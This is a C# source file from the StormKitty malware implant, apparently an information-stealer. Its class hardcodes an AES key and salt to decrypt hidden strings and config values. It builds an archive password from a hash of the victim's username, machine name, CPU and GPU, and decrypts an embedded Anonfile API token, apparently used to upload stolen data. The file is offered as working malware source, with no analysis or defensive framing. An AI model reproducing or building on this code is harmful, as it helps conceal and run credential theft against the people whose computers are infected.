/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Security.Cryptography;

namespace StormKitty.Implant
{
    internal sealed class StringsCrypt
    {
        // Salt
        public static string ArchivePassword = GenerateRandomData();
        private static readonly byte[] saltBytes = new byte[] { 255, 64, 191, 111, 23, 3, 113, 119, 231, 121, 252, 112, 79, 32, 114, 156 };
        private static readonly byte[] cryptKey = new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 76, 105, 109, 101, 114, 66, 111, 121, 47, 83, 116, 111, 114, 109, 75, 105, 116, 116, 121 };
        public static string github = Encoding.UTF8.GetString(cryptKey);

        // Create hash from username, pcname, cpu, gpu
        public static string GenerateRandomData(string sd = "0")
        {
            string number;
            if (sd == "0")
                number = new Random().Next(0, 10).ToString();
            else
                number = sd;

            string data = $"{number}-{SystemInfo.username}-{SystemInfo.compname}-{SystemInfo.culture}-{SystemInfo.GetCPUName()}-{SystemInfo.GetGPUName()}";
            using (MD5 hash = MD5.Create())
            {
                return string.Join
                (
                    "",
                    from ba in hash.ComputeHash
                    (
                        Encoding.UTF8.GetBytes(data)
                    )
                    select ba.ToString("x2")
                );
            }
        }

        /*
        // Print bytes
        private static string PrintByteArray(byte[] bytes)
        {
            var sb = new StringBuilder("new byte[] { ");
            foreach (var b in bytes)
            {
                sb.Append(b + ", ");
            }
            sb.Append("}");
            return sb.ToString();
        }

        // Encrypt string 
        public static string Encrypt(string text)
        {
            byte[] bytesToBeEncrypted = Encoding.UTF8.GetBytes(text);
            byte[] encryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return PrintByteArray(encryptedBytes);
        }
        */

        // Decrypt string
        public static string Decrypt(byte[] bytesToBeDecrypted)
        {
            byte[] decryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        // Decrypt config value
        public static string DecryptConfig(string value)
        {
            if (string.IsNullOrEmpty(value))
                return "";

            if (!value.StartsWith("ENCRYPTED:"))
                return value;

            return Decrypt(Convert.FromBase64String(value
                .Replace("ENCRYPTED:", "")));
        }

        // Anonfile API key
        public static string AnonApiToken = Decrypt(new byte[] { 169, 182, 79, 179, 252, 54, 138, 148, 167, 99, 216, 216, 199, 219, 10, 249, 131, 166, 170, 145, 237, 248, 142, 78, 196, 137, 101, 62, 142, 107, 245, 134, });
    }
}
